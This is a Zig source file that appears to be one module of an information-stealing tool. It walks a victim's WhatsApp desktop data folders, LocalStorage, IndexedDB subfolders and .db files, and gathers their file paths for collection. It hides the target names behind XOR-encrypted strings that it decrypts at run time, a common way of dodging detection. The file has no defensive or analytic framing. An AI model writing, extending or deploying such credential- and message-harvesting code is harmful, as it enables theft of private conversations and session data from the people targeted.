const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    const WHATSAPP = hash.xorEncrypt("WhatsApp");
    const LOCAL_STORAGE = hash.xorEncrypt("LocalStorage");
    const INDEXEDDB = hash.xorEncrypt("IndexedDB");
    const DB_EXT = hash.xorEncrypt(".db");
};

fn collectDirFiles(allocator: std.mem.Allocator, dir_path: []const u8, files: *std.ArrayList([]const u8)) void {
    var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch return;
    defer dir.close();
    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const full = std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name }) catch continue;
        files.append(full) catch {
            allocator.free(full);
            return;
        };
    }
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var wa_buf: [E.WHATSAPP.len]u8 = undefined;
    var ls_buf: [E.LOCAL_STORAGE.len]u8 = undefined;
    var idb_buf: [E.INDEXEDDB.len]u8 = undefined;
    var db_ext_buf: [E.DB_EXT.len]u8 = undefined;
    hash.xorDecrypt(&E.WHATSAPP, &wa_buf);
    hash.xorDecrypt(&E.LOCAL_STORAGE, &ls_buf);
    hash.xorDecrypt(&E.INDEXEDDB, &idb_buf);
    hash.xorDecrypt(&E.DB_EXT, &db_ext_buf);

    const base_path = std.fs.path.join(allocator, &[_][]const u8{ local, wa_buf[0..] }) catch return try allocator.alloc([]const u8, 0);
    defer allocator.free(base_path);

    const ls_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, ls_buf[0..] }) catch {};
    if (ls_path) |lp| {
        defer allocator.free(lp);
        collectDirFiles(allocator, lp, &files);
    }

    const idb_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, idb_buf[0..] }) catch {};
    if (idb_path) |ip| {
        defer allocator.free(ip);
        var dir = std.fs.openDirAbsolute(ip, .{ .iterate = true }) catch {};
        if (dir) |*d| {
            defer d.close();
            var iter = d.iterate();
            while (iter.next() catch {}) |entry| {
                if (entry.kind != .directory) continue;
                const sub = std.fs.path.join(allocator, &[_][]const u8{ ip, entry.name }) catch continue;
                defer allocator.free(sub);
                collectDirFiles(allocator, sub, &files);
            }
        }
    }

    var dir = std.fs.openDirAbsolute(base_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();
    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        if (!std.mem.endsWith(u8, entry.name, db_ext_buf[0..])) continue;
        const full = std.fs.path.join(allocator, &[_][]const u8{ base_path, entry.name }) catch continue;
        try files.append(full);
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__whatsapp");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collectDirFiles skips missing dir" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    collectDirFiles(std.testing.allocator, "C:\\__nonexistent__", &list);
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}
